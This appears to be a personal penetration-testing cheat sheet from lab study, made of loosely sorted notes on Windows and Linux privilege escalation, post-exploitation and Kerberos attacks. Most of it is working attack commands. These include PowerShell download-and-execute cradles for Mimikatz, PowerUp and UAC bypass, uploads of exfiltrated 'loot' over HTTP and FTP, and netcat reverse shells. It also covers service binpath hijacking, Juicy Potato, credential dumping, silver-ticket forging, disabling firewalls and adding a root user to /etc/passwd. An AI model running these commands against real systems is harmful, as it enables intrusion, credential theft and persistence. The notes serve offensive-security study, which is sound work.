## just a dump from all my notes and cherry trees##
## to do: sort this ##

Remember:

	powershell -Exec Bypass IEX "(New-Object Net.WebClient).DownloadString('http://192.168.119.198/PowerUp.ps1');Invoke-AllChecks"

	powershell -Exec bypass IEX "(New-Object Net.WebClient).DownloadString('http://192.168.119.198/Sherlock.ps1');Find-AllVulns"

	powershell.exe Start-Process cmd.exe -Verb runAs

	powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

	powershell -Exec Bypass IEX -C “(New-Object Net.WebClient).DownloadString('http://192.168.119.198/Invoke-Mimikatz.ps1')”



Windows PrivEsc Mapping

	Tooling
		## Consider making aliases for these to bring them up quickly, see examples below
		web3up
		webup
		smbup
		
		# bring up an SMB share to host files
		impacket-smbserver share .
		
		# print up an HTTP server to host files
		python3 -m http.server 80
		
		python -m SimpleHTTPServer 80
		
	
	Tools
		## different tools can be listed here but these are generally good
		
		2019-11-17-mssb.xls
		accesschk64.exe
		accesschk.exe
		accesschk-XP.exe
		Invoke-PowerShellTcp.ps1
		Invoke-SessionGopher.ps1
		Invoke-Tater.ps1
		Invoke-TokenManipulation.ps1
		jaws-enum.ps1
		kernelAbatchy/ #precompiled kernel exploits from https://github.com/abatchy17/WindowsExploits
		kernelSecWiki/ #precompiled kernel exploits from https://github.com/SecWiki/windows-kernel-exploits
		lazagne.exe
		Powerless.bat
		PowerUp.ps1
		Seatbelt.exe
		SharpUp.exe
		Sherlock.ps1
		tmp/ # folder for random files that you want to transfer
		winbin/ #a copy of windows binaries in /usr/share/windows-binaries/
			nc64.exe
			nc.exe
			plink.exe
			vncviewer.exe
			wget.exe
			whoami.exe
			...
		windows-exploit-suggester.py
		winPEASany.exe
		winPEASx64.exe
		winPEASx86.exe
		
		## launch the tools quickly without having to transfer them first on the target itself
		
		#WinPEAS 
		//192.168.119.198/share/winPEASx64.exe searchall cmd

		#PowerUp
		powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/PowerUp.ps1'); Invoke-AllChecks"

		#Sherlock
		powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/Sherlock.ps1'); Find-AllVulns"

		#JAWS
		powershell.exe -ExecutionPolicy Bypass -File //192.168.194.141/share/jaws-enum.ps1

		#Seatbelt - search for non standard services
		//192.168.194.141/share/Seatbelt.exe NonstandardServices

		#Lazagna - search for passwords
		//192.168.194.141/share/lazagne.exe all

		#SessionGopher - search for passwords
		powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http:/

	
	Post Exploitation
		FILE TRANSFER 
			HTTP 
				serve 
					python -m SimpleHTTPServer $port
					
					python3 -m http.server $port
				
				get 
					powershell wget clone
					
					vbs wget clone
					
				upload powershell
					powershell (New-Object System.Net.WebClient).UploadFile('hxxp://192.168.119.198/upload.php','important_loot.docx')
					
				download powershell
					powershell.exe -Exec Bypass -nonInteractive -noProfile (New-Object System.Net.Webclient).DownloadFile($url,$output)
					
					powershell (New-Object System.Net.Webclient).DownloadFile('hxxp://192.168.119.198/plink.exe','plink.exe')
					
			FTP
				non interactive
					on target
						GET 
							echo "open 192.168.119.198.21" > ftp.txt
							echo "offsec" >> ftp.txt
							echo "bin" >> ftp.txt
							echo "get shell.exe" >> ftp.txt
							echo "bye" >> ftp.txt 
						
							ftp -v -n -s:ftp.txt
						PUT 
							echo "open 192.168.119.198.21" > ftp.txt
							echo "offsec" >> ftp.txt
							echo "bin" >> ftp.txt
							echo "put super_secret_loot.docx" >> ftp.txt
							echo "bye" >> ftp.txt 
						
							ftp -v -n -s:ftp.txt	
			NETCAT
				on listener
					nc -l -p $listen_port > outfile
				on sender
					nc -w 5 $dest_ip $listen_port < infile

		CMD
			general information
				systeminfo
				
				systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"  
			
			user groups info
				net user
				
				whoami /priv
				
				whoami /groups
				
			list processes
				tasklist
				tasklist /SVC
				wmic process
				
			services
				list-all
					wmic
						wmic service list brief
							for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
							
							for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
							
						wmic service list full
					
					sc
						sc query state=all|findstr "SERVICE_NAME:" >> c:\windows\temp\servicenames.txt 
							FOR /F %i in (c:\windows\temp\servicenames.txt) DO echo %i type c:\windows\temp\servicenames.txt
							
							FOR /F "tokens=2" %i in (c:\windows\temp\servicenames.txt) DO @echo %i >> c:\windows\temp\services.txt
							
							FOR /F %i in (c:\windows\temp\services.txt) DO @sc qc %i |findstr "BINARY_PATH_NAME" >> c:\windows\temp\paths.txt
							
							# clean up and remove quoted paths
							
							FOR /F "delims=" %i in (c:\Windows\temp\paths.txt) DO @echo %i |findstr /V """
							
							
							# perform final check with cacls
							
							FOR /F %i in (C:\windows\temp\paths.txt) DO @icacls %i >> c:\windows\temp\acls.txt
				
				restart service
					restart directly
						net stop $name
						
						wmic service $name call startservice
						
					restart the host
						wmic service where caption="$name" get name, caption, state, startmode
							check if autostart is enabled
						whoami /priv
							check if SeShutdownPrivilege
						shutdown /r /t 0
				
			list network interfaces
				ipconfig /all
			
			DNS/Hosts information
				type c:\Windows\system32\drivers\etc\hosts
				 
			list drivers
				driverquery /v  # don't use this, its lame and bad for the eyes
				
				driverquery.exe /v /fo csv | ConvertFrom-CSV | select-object 'Display Name', 'Start Mode', Path
				
			list network shares
				net use 
				
			routes
				route print
				
				arp -A
				
			list ports 
				netstat -ano
				
			list scheduled tasks
				schtasks /query /fo LIST /v
				
			installed applications
				wmic product get name, version ,vendor
				
			system patches
				wmic qfe get Caption, Description, HotFixID, InstalledOn
				
			check permissions
				icacls "C:\Program Files\Path\to\Executable.exe"
				
			firewall rules
				netsh advfirewall show currentprofile
				
				netsh advfirewall show allprofiles
				
				netsh advfirewall firewall show rule name=all
				
				netsh firewall show state
				
				netsh firewall show config
				
			disable firewall
				advfirewall set allprofiles state off
				
				netsh advfirewall set allprofiles state off
				
			Autoelevate set
				reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
				
				reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
				
			sysinternals tools
				list writable programs
					accesschk.exe -uws "Everyone" "C:\Program Files"
					
			search sensitive information
				findstr /si password *.txt
				
				findstr /si password *.xml
				
				findstr /si password *.ini
				
				dir /s *pass* == *cred* == *nvc* == *.config*
				
				findstr /spin "password" *.*
				
				dir c:\*vnc.ini /s /b
				
				dir c:\*ultravnc.ini /s /b 
				
				dir c:\ /s /b | findstr /si vnc.ini
				
				reg query HKLM /f password /t REG_SZ /s
				
				reg query HKCU /f password /t REG_SZ /s 
				
				file locations
				
					c:\sysprep.info
					
					c:\sysprep\sysprep.xml 
					
					c:\unattend.xml
					
					%WINDIR%\Panther\Unattend\Unattended.xml
					
					%WINDIR%\Panther\Unattended.xml
					
				Registry 
					VNC
						reg query "HKCU\Software\ORL\WinVNC3\Password"
						
					Autologin
						req query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
						
					SNMP
						reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
						
					Putty
						reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
						
				File types
					dir /s /b *.conf  ## or any other file type you want
					
				keepass database
					dir /s /b *.kbdx
				
		PowerShell
			runAs Admin
				powershell.exe Start-Process cmd.exe -Verb RunAs
				
			List Running Services\SNMP
				Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
				
			List driver info by name 
				Get-WmiObject Win32_PnPSignedDriver | Select-Object Devicename, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
				
			Writable programs
				Get-Children "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "everyone\sAllow\s\sModify"}
				
			check for WSL
				bash -c whoami
				
		Scripts
			SharpUP.exe
			
			Windows exploit suggester NG
				python wes.py c:\windows\temp\systeminfo.txt -e -i Elevation of Privilege
				
			Windows Exploit Suggester
				python windows-exploit-suggester.py --database 2020-09-09-mssb.xls --systeminfo systeminfo.txt
				
		UAC Bypass
			Windows 10
				fodhelper.exe
				
		Methods
			WinXP -upnp service binary
				sc config upnphost binpath="hello"
				
				sc config upnphost
				
				exploit
					sc config pnpnhost binpath="C:\InetPub\nc.exe $IP $PORT -e c:\windows\system32\cmd.exe"
					
					sc config upnphost obj= ".\LocalSystem" password=""
					
					sc qc upnphost
					
					net start upnphost
			
			Unquoted Service Paths
				wmic 
					wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" |findstr /i /v """
					
				sc
					sc query
					
					sc qc service name
			
			Group Policy Preference
				set 
					look for 
						LOGONSERVER=\\NAMEOFSERVER
						
						USERDNSDOMAIN=DOMAINNAME.LOCAL 
						
			USOSVC binpath
				sc stop UsoSvc 
				
			Juicy Potato
				whoami /priv
					SeImpersonatePrivilege
					
					JuicyPotatoe.exe -l 1337 -p c:\Windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc.exe -e cmd.exe $ip $port" -t *
					
					search the correct CID
						sc query
						
						check service list from website
						
			NT Authority\network service on "old" win 
				churrasco.exe ""C:\Inetbup\nc.exe 192.168.119.198 1337 -e C:\windows\system32\cmd.exe""
				
		Reverse Shells
			"C:\InetPub\nc.exe $ip $port -e C:\windows\system32\cmd.exe"
			
		
		Pivoting 
			plink.exe
				remote port forward
					cmd.exe /c echo y | plink.exe -ssh -l $user -pw $password -R kali_host:kali_port:127.0.0.1:$local_port kali_host
					



Stealthy Powershell

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1



### WINDOWS RECON ###

whoami

whoami /priv

whoami /group

hostname

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

tasklist /SVC  # list running processes for current user

netstat -ano	# list all active connections 

netsh advfirewall show currentprofile	#show current firewall profile

wmic product get name, version, vendor

wmic service get name,displayname,pathname,startmode

wmic service get name,displayname,pathname,startmode | findstr /i "auto"

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"

wmic qfe get Caption, Description, HotFixID, InstalledOn

accesschk.exe -uws "Everyone" "C:\Program Files"

PS C:\Users\student> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

mountvol

#Bypass Traverse checking# 
powershell.exe Start-Process cmd.exe -Verb runAs

#Execute some sneaky powershells#
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.198/Program.exe', 'C:\Program.exe')

powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')


# Enumerating Device Drivers and Kernel Modules #

PS C:\Users\student> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path

# provides digital signature information about drivers #

PS C:\Users\student> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}


# Enumerating Binaries That AutoElevate #

c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer


# Enumerate Unquoted servce path software#

Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\Program Files\Serviio\bin\ServiioService.exe"

move a file over and replace the original, always save a backup

wmic service where caption="Serviio" get name, caption, state, startmode #from cmd.exe only


### GETTING POWERSHELLS ###

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/PowerView.ps1'); Get-NetLoggedon -Computername client251"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/PowerView.ps1'); Get-NetSession -Computername <dc-name>"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/PowerUp.ps1');Invoke-AllChecks"

powershell -Exec Bypass -NoProfile -NonInteractive -Nologo -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/Invoke-BypassUAC.ps1')

powershell -Exec Bypass -NoProfile -NonInteractive -Nologo -C "IEX (New-Object Net.WebClient).Do
wnloadString('http://192.168.119.198/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/Invoke-Mimikatz.ps1');Invoke-Mimikatz --DumpCreds"


#import module,run manually#
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.198/Invoke-Mimikatz.ps1')"

Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam" 


## Kerberos ##
# Create ticket and crack it #

Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'


# Kerberoast #
.\Invoke-Kerberoast.ps1 -domain corp.com | fl  # should show hashes

.\Invoke-Kerberoast.ps1 -domain corp.com | Select -ExpandProperty hash | Out-File -Encoding ASCII ./outhash.txt


# Mimikatz get Silver ticket #
wmic useraccount where name='sql_service' get sid
S-1-5-21-4038953314-3014849035-1274281563-1107

 kerberos::golden /user:sql_service /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4: /ptt

# One-Liner to ping all hosts on the local network #

for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.



### LINUX RECON ###

cat /etc/*-release*

cat /etc/*issue*

sudo -l 

ip a # show all ip config information

/sbin/route -v # show all route information

ss -anp # display all active network connections also works with netstat!

dpkg -l

find / -writable -type d 2>/dev/null

cat /etc/fstab

# Enum Running processes #

ps aux

# Enum System Services #

systemctl

# Enum installed applications #

ls /usr/bin

# Enumerate Open ports that may have vulnerable services #

netstat -tulpn

# Enumerate Kernel version #

uname -a 

# Enum environment variables #

env

# Enum attached filesystems for shares #

cat /etc/fstab




# Enumerating Binaries That AutoElevate #

find / -perm -u=s -type f 2>/dev/null


#create a password to add malicious user to /etc/passwd/#

openssl passwd evil

echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2


# Enumerating Binaries That AutoElevate #

find / -perm -u=s -type f 2>/dev/null


